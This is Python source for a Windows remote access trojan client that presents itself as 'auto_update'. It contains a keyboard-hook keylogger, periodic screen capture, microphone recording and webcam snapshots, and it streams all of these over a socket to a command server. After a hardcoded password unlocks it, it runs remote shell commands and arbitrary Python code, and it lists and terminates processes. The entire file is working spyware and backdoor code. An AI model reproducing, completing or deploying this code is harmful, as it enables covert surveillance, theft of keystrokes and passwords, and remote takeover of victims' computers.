# -*- coding: utf-8 -*-
# !/usr/bin/python

import socket
import time
import ast
import sys
import os
import platform
import ctypes
from ctypes.wintypes import MSG
import threading
import subprocess
import sched
import datetime
import zlib

import wave

HOST = '127.0.0.1'
PORT = 4434
ACTIVE = False
UNLOCKED = False
SECRET = r'1705a7f91b40320a19db18912b72148e'  # MD5 key: paroli123
ID = ''
secret_key = r'1705a7f91b40320a19db18912b72148e'  # MD5 key: paroli123

destination_directory = 'iDocuments'
client_name = 'auto_update'
client_version = '1.0'
os_type = str(sys.platform)
os_name = str(platform.platform())
os_user = os.path.expanduser('~').split('\\')[-1]

KEY_LOGS = {}
SCREENSHOT_LOGS = {}
AUDIO_LOGS = {}

GLOBAL_SOCKET = None
CURRENT_WINDOW_TITLE = None

uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

try:
    import vidcap
    cam = vidcap.new_Dev(0, 0)
    web_camera_input = str(cam.getdisplayname())
    del cam
except:
    web_camera_input = 'NoDevice'

try:
    import pyaudio
    p = pyaudio.PyAudio()
    device_name = p.get_default_input_device_info()
    del p
    audio_input = device_name['name']
except (IOError, NameError):
    audio_input = 'NoDevice'

# Init Winapi
Kernel32 = ctypes.windll.kernel32
User32 = ctypes.windll.user32
Shell32 = ctypes.windll.shell32
Gdi32 = ctypes.windll.gdi32
Psapi = ctypes.windll.psapi

# Init Screen Variables
hDesktopWnd = User32.GetDesktopWindow()
left = User32.GetSystemMetrics(76)
top = User32.GetSystemMetrics(77)
right = User32.GetSystemMetrics(78)
bottom = User32.GetSystemMetrics(79)
width = right - left
height = bottom - top


class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', ctypes.c_uint32),
        ('biWidth', ctypes.c_int),
        ('biHeight', ctypes.c_int),
        ('biPlanes', ctypes.c_short),
        ('biBitCount', ctypes.c_short),
        ('biCompression', ctypes.c_uint32),
        ('biSizeimage', ctypes.c_uint32),
        ('biXPelsPerMeter', ctypes.c_long),
        ('biYPelsPerMeter', ctypes.c_long),
        ('biClrUsed', ctypes.c_uint32),
        ('biClrImportant', ctypes.c_uint32)]


class BITMAPINFO(ctypes.Structure):
    _fields_ = [
        ('bmiHeader', BITMAPINFOHEADER),
        ('bmiColors', ctypes.c_ulong * 3)]

bmp_info = BITMAPINFO()

shiftcodes = {
    49: '!', 50: '@', 51: '#', 52: '$', 53: '%',
    54: '^', 55: '&', 56: '*', 57: '(', 48: ')',
    189: '_', 187: '+', 219: '{', 221: '}', 220: '|',
    186: ':', 222: '"', 188: '&lsaquo;', 190: '&rsaquo;', 191: '?',
}
keycodes = {
    160: '', 161: '', 32: '&nbsp;',
    9: '<font color=#288DA1>{tab}</font>', 8: '<font color=#D32B4E>{del}</font>', 162: '', 163: '', 144: '',
    35: '', 34: '', 33: '', 36: '', 45: '', 145: '', 19: '', 13: '<br>',
}
updatecode = {
    189: '-', 187: '=', 219: '[', 221: ']', 220: '\\',
    186: ';', 222: '\'', 188: ',', 190: '.', 191: '/',
    96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
    101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
    111: '/', 106: '*', 109: '-', 107: '+',
    110: '.'
}

# Init Processes Variables
EnumProcesses = Psapi.EnumProcesses
EnumProcesses.restype = ctypes.wintypes.BOOL
GetProcessImageFileName = Psapi.GetProcessImageFileNameA
GetProcessImageFileName.restype = ctypes.wintypes.DWORD
OpenProcess = Kernel32.OpenProcess
OpenProcess.restype = ctypes.wintypes.HANDLE
TerminateProcess = Kernel32.TerminateProcess
TerminateProcess.restype = ctypes.wintypes.BOOL
CloseHandle = Kernel32.CloseHandle
MAX_PATH = 260
PROCESS_TERMINATE = 0x0001
PROCESS_QUERY_INFORMATION = 0x0400


def init():
    if os.path.exists('info.nfo'):
        variables = open('info.nfo', 'r').read()
        return ast.literal_eval(variables)
    else:
        variables = {
            'i': '',
            'kts': True,
            'kt': 30,
            'ats': False,
            'at': 30,
            'atr': 1500,
            'sts': False,
            'std': 20,
            'st': 30,
        }
        open('info.nfo', 'w').write(str(variables))
        return variables


def get_date_time():
    now = datetime.datetime.now()
    year = now.year
    month = now.month
    if len(str(month)) < 2:
        month = '0'+str(month)
    day = now.day
    if len(str(day)) < 2:
        day = '0'+str(day)
    hour = now.hour
    minute = now.minute
    second = now.second
    return '%s-%s-%s_%s-%s-%s' % (year, month, day, hour, minute, second)


def screen_bits():
    h_desktop_dc = User32.GetWindowDC(hDesktopWnd)
    h_capture_dc = Gdi32.CreateCompatibleDC(h_desktop_dc)
    h_capture_bitmap = Gdi32.CreateCompatibleBitmap(h_desktop_dc, width, height)
    Gdi32.SelectObject(h_capture_dc, h_capture_bitmap)
    Gdi32.BitBlt(h_capture_dc, 0, 0, width, height, h_desktop_dc, left, top, 0x00CC0020)
    hdc = User32.GetDC(None)
    bmp_info.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    dib_rgb_colors = 0
    Gdi32.GetDIBits(hdc, h_capture_bitmap, 0, 0, None, ctypes.byref(bmp_info), dib_rgb_colors)
    bmp_info.bmiHeader.biSizeimage = int(
            bmp_info.bmiHeader.biWidth * abs(bmp_info.bmiHeader.biHeight) * (bmp_info.bmiHeader.biBitCount + 7) / 8)
    p_buf = ctypes.create_unicode_buffer(bmp_info.bmiHeader.biSizeimage)
    Gdi32.GetBitmapBits(h_capture_bitmap, bmp_info.bmiHeader.biSizeimage, p_buf)
    return zlib.compress(p_buf)


# TODO: Keylogger, Scheduler
def send_keylog():
    global GLOBAL_SOCKET
    global ACTIVE
    global CURRENT_WINDOW_TITLE
    global KEY_LOGS

    config = init()
    if config['kts'] and len(KEY_LOGS) > 0 and ACTIVE:
        CURRENT_WINDOW_TITLE = ''
        keys_for_send = str(KEY_LOGS)
        KEY_LOGS = {}
        data_send(GLOBAL_SOCKET, keys_for_send, 'keyloggerLogs')
    key_scheduler = sched.scheduler(time.time, time.sleep)
    key_scheduler.enter(config['kt'], 1, send_keylog, ())
    key_scheduler.run()


def send_screenshot():
    global GLOBAL_SOCKET
    global ACTIVE
    global SCREENSHOT_LOGS

    config = init()
    if config['sts'] and len(SCREENSHOT_LOGS) > 0 and ACTIVE:
        for i in SCREENSHOT_LOGS.keys():
            data_send(GLOBAL_SOCKET, str(SCREENSHOT_LOGS[i]), 'screenshotLogs')
        SCREENSHOT_LOGS = {}
    screen_scheduler = sched.scheduler(time.time, time.sleep)
    screen_scheduler.enter(config['st'], 1, send_screenshot, ())
    screen_scheduler.run()


def send_audio():
    global AUDIO_LOGS
    config = init()
    if config['ats'] and len(AUDIO_LOGS) > 0:
        for i in AUDIO_LOGS.keys():
            data_send(GLOBAL_SOCKET, str(AUDIO_LOGS[i]), 'audioLogs')
        AUDIO_LOGS = {}
    audio_scheduler = sched.scheduler(time.time, time.sleep)
    audio_scheduler.enter(config['at'], 1, send_audio, ())
    audio_scheduler.run()


def run_scheduler():
    key_thread = threading.Thread(target=send_keylog)
    key_thread.start()
    screen_thread = threading.Thread(target=send_screenshot)
    screen_thread.start()
    audio_thread = threading.Thread(target=send_audio)
    audio_thread.start()


def get_fptr(fn):
    cmpfunc = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
    return cmpfunc(fn)


class KeyLogger:
    def __init__(self):
        self.hooked = None

    def install_hook_proc(self, pointer):
        self.hooked = User32.SetWindowsHookExA(13, pointer, Kernel32.GetModuleHandleW(None), 0)
        if not self.hooked:
            return False
        return True

    def uninstall_hook_proc(self):
        if self.hooked is None:
            return
        ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None


class Key(threading.Thread):
    def __init__(self):
        super(Key, self).__init__()

        global KEY_LOGS

    def update_key(self, k):
        if updatecode.has_key(k):
            return updatecode[k]
        else:
            return str(chr(k))

    def write_key(self, log):
        global CURRENT_WINDOW_TITLE

        new_window_title = get_window_title()

        if CURRENT_WINDOW_TITLE == new_window_title:
            try:
                KEY_LOGS['logs'] += log.encode('utf-8')
            except UnicodeDecodeError:
                KEY_LOGS['logs'] += '<font color="red">{UnicodeError}</font>'
        else:
            if KEY_LOGS.has_key('logs'):
                KEY_LOGS['logs'] += '<br><p align="center" style="background-color: #34495e;color: #ecf0f1;"><font color="#e67e22">[%s] </font>' % get_date_time() + new_window_title + '</p><br>' + log.encode('utf-8')
            else:
                KEY_LOGS['logs'] = '<br><p align="center" style="background-color: #34495e;color: #ecf0f1;"><font color="#e67e22">[%s] </font>' % get_date_time() + new_window_title + '</p><br>' + log.encode('utf-8')
            CURRENT_WINDOW_TITLE = new_window_title

    def hook_proc(self, n_code, w_param, l_param):
        if w_param is not 0x0100:
            return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)

        if keycodes.has_key(l_param[0]):
            key = keycodes[l_param[0]]
        else:
            if User32.GetKeyState(0x14) & 1:
                if User32.GetKeyState(0x10) & 0x8000:
                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else self.update_key(l_param[0]).lower()
                else:
                    key = self.update_key(l_param[0]).upper()
            else:
                if User32.GetKeyState(0x10) & 0x8000:
                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else self.update_key(l_param[0]).upper()
                else:
                    key = self.update_key(l_param[0]).lower()

        self.write_key(key)
        return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)

    def start_keylogger(self):
        msg = MSG()
        User32.GetMessageA(ctypes.byref(msg), 0, 0, 0)

    def run(self):
        self.keyLogger = KeyLogger()
        self.pointer = get_fptr(self.hook_proc)
        if self.keyLogger.install_hook_proc(self.pointer):
            pass
        self.start_keylogger()


class AudioStreaming(threading.Thread):
    def __init__(self, rate):
        super(AudioStreaming, self).__init__()

        self.active = True

        self.chunk = 1024
        self.format = pyaudio.paInt16
        self.channel = 1
        self.rate = rate

        self.frames = []

        self.p = pyaudio.PyAudio()

        self.stream = self.p.open(format=self.format, channels=self.channel, rate=self.rate, input=True,
                                  frames_per_buffer=self.chunk)

    def run(self):
        global AUDIO_LOGS

        config = init()

        while self.active:
            if len(self.frames) > config['at']*4.6:
                AUDIO_LOGS[get_date_time()] = {
                    'raw': zlib.compress(b''.join(self.frames)),
                    'format': self.format,
                    'channel': self.channel,
                    'rate': self.rate,
                }
                self.frames = []
            self.frames.append(self.stream.read(self.chunk))

        self.stream.close()
        self.p.terminate()

# Screen Shots
class Screenshoter(threading.Thread):

    def run(self):

        while 1:
            config = init()
            if config['sts']:
                delay = config['std']
                SCREENSHOT_LOGS[get_date_time()] = {
                    'screen_bits': screen_bits(),
                    'title_name': get_window_title(),
                    'width': width,
                    'height': height,
                    'date': get_date_time(),
                }
                time.sleep(delay)
            else:
                break


# TODO: TEMP
run_scheduler()
keylogger = Key()
keylogger.start()
screenshoter = Screenshoter()
screenshoter.start()
audioLogger = AudioStreaming(5120)
audioLogger.start()

def check_info():
    global UNLOCKED
    return {
        'os_type':          os_type,
        'os':               os_name,
        'protection':       str(UNLOCKED),
        'user':             os_user,
        'privileges':       str(Shell32.IsUserAnAdmin()),
        'audio_device':     audio_input,
        'webcamera_device': web_camera_input,
        'window_title':     get_window_title(),
        'key':              ID,
    }


def get_key():
    vars_dict = init()
    return vars_dict['i']


def set_key(key):
    global ID
    vars_dict = init()
    vars_dict['i'] = key
    input_file = open('info.nfo', 'w')
    input_file.write(str(vars_dict))
    input_file.close()
    ID = key
    return


def get_window_title():
    get_foreground_window = User32.GetForegroundWindow
    get_window_text_length = User32.GetWindowTextLengthW
    get_window_text = User32.GetWindowTextW
    hwnd = get_foreground_window()
    length = get_window_text_length(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    get_window_text(hwnd, buff, length + 1)
    return buff.value


def get_screenshot():
    return str({
        'width': width,
        'height': height,
        'screenshotbits': screen_bits()
    })


def webcam_shot():
    cam = vidcap.new_Dev(0, 0)
    buff, width, height = cam.getbuffer()
    return str({
        'webcambits': zlib.compress(buff),
        'width': width,
        'height': height,
    })


def data_receive(sock, end='[ENDOFMESSAGE]'):
    received_data = ''
    try:
        payload = sock.recv(1024)
        while payload:
            received_data = received_data + payload
            if received_data.endswith(end):
                received_data = received_data[:-len(end)]
                break
            else:
                payload = sock.recv(1024)
                continue
        return ast.literal_eval(received_data)
    except socket.error:
        return {'payload': '', 'mode': '', 'from': '', 'to': ''}


# Send Data Function
def data_send(sock, message, mode, session_id='', end='[ENDOFMESSAGE]'):
    global ID
    global ACTIVE
    message = {
        'payload': message,
        'mode': mode,
        'from': 'client',
        'session_id': session_id,
        'key': ID,
    }
    try:
        sock.sendall(str(message)+end)
        ACTIVE = True
    except socket.error:
        return


###
# FUNCTIONS
###
# Run Shell Command
def run_shell(cmde):
    if cmde:
        try:
            execproc = subprocess.Popen(cmde, shell=True,
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            cmdoutput = execproc.stdout.read() + execproc.stderr.read()
            return cmdoutput
        except Exception as e:
            return str(e)

    else:
        return "Enter a command.\n"

# Get Processes
def get_processes_list():
    PROCESSES = {}
    max_array = ctypes.c_ulong * 4096
    pProcessIds = max_array()
    pBytesReturned = ctypes.c_ulong()
    Psapi.EnumProcesses(ctypes.byref(pProcessIds), ctypes.sizeof(pProcessIds), ctypes.byref(pBytesReturned))
    nReturned = pBytesReturned.value/ctypes.sizeof(ctypes.c_ulong())
    pidProcessArray = [i for i in pProcessIds][:nReturned]
    for ProcessId in pidProcessArray:
        hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, ProcessId)
        if hProcess:
            ImageFileName = (ctypes.c_char*MAX_PATH)()
            if GetProcessImageFileName(hProcess, ImageFileName, MAX_PATH)>0:
                filename = os.path.basename(ImageFileName.value)
                PROCESSES[ProcessId] = filename
            CloseHandle(hProcess)
    return str(PROCESSES)


# Terminate Process
def terminateProcess(PID):
    hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, PID)
    TerminateProcess(hProcess, 1)


def executeScript(source):
    mprint = ''
    try:
        exec source
        if mprint == '':
            return '<font color="#e74c3c">No output</font><br>example: mprint = "STRING type"'
        return str(mprint)
    except Exception as e:
        return str(e)


def send_info(sock):
    global ACTIVE

    while ACTIVE:
        try:
            data_send(sock, check_info(), 'infoChecker')
            time.sleep(5)
        except socket.error:
            ACTIVE = False


def reactor():
    global ACTIVE
    global UNLOCKED
    global ID
    global GLOBAL_SOCKET

    while 1:
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((HOST, PORT))
            ACTIVE = True
        except:
            ACTIVE = False
            time.sleep(5)
            continue

        GLOBAL_SOCKET = server_socket

        while ACTIVE:
            try:

                # Begin Init
                data = data_receive(server_socket)
                if data['mode'] == 'connectSuccess':
                    key = get_key()
                    if len(key) != 0:
                        ID = key
                        data_send(server_socket, key, 'clientInitializing')
                    else:
                        data_send(server_socket, 'noKey', 'clientInitializing')
                        new_key = data_receive(server_socket)
                        set_key(new_key['payload'])
                        ID = new_key['payload']

                    info_sernder_thread = threading.Thread(target=send_info, args=(server_socket,))
                    info_sernder_thread.start()

                    # After Initialized
                    while ACTIVE:
                        try:
                            data = data_receive(server_socket)
                        except socket.error:
                            break

                        if len(data['payload']) == 0 and len(data['mode']) == 0:
                            break

                        if data['mode'] == 'unlockClient':
                            pass_key = data['payload']
                            if pass_key == SECRET:
                                UNLOCKED = True

                                data_send(server_socket, 'loginSuccess', 'loginSuccess', session_id=data['session_id'])

                                while UNLOCKED:

                                    try:
                                        data = data_receive(server_socket)

                                        # Lock Client
                                        if data['mode'] == 'lockClient':
                                            UNLOCKED = False
                                            continue

                                        # Terminate Client
                                        if data['mode'] == 'terminateClient':
                                            os._exit(1)

                                        # Explorer Commands
                                        elif data['mode'] == 'explorerMode' and data['payload'].startswith('cd '):
                                            try:
                                                os.chdir(data['payload'][3:])
                                                output = ''
                                            except:
                                                output = 'dirOpenError'

                                        # Execute Script
                                        elif data['mode'] == 'scriptingMode':
                                            output = executeScript(data['payload'])

                                        # Get Desktop Preview
                                        elif data['mode'] == 'getScreen':
                                            output = get_screenshot()

                                        # Get Webcam Preview
                                        elif data['mode'] == 'getWebcam':
                                            output = webcam_shot()

                                        # Get Processes List
                                        elif data['mode'] == 'getProcessesList':
                                            output = get_processes_list()

                                        # Terminate Process
                                        elif data['mode'] == 'terminateProcess':
                                            terminateProcess(data['payload'])
                                            continue

                                        # Shell Mode
                                        elif data['mode'] == 'shellMode':
                                            output = run_shell(data['payload'])

                                        # Run Shell
                                        else:
                                            data_send(server_socket, 'unknownCommandError', 'unknownCommandError', session_id=data['session_id'])
                                            continue

                                        data_send(server_socket, output, 'clientMode', session_id=data['session_id'])

                                    except socket.error:
                                        break
                                    except KeyError:
                                        break

                            else:
                                data_send(server_socket, 'notAuthorized', 'notAuthorized', session_id=data['session_id'])

                        # Lock Client Functions
                        # Desktop Screenshot
                        elif data['mode'] == 'getScreen':
                            data_send(server_socket, get_screenshot(), 'getScreen', session_id=data['session_id'])
                            continue

                        # Webcamera Shot
                        elif data['mode'] == 'getWebcam':
                            data_send(server_socket, webcam_shot(), 'getWebcam', session_id=data['session_id'])
                            continue

                        else:
                            data_send(server_socket, 'notAuthorized', 'notAuthorized')
                            continue

                else:
                    break

            except socket.error:
                server_socket.close()
                time.sleep(10)
                break

reactor()
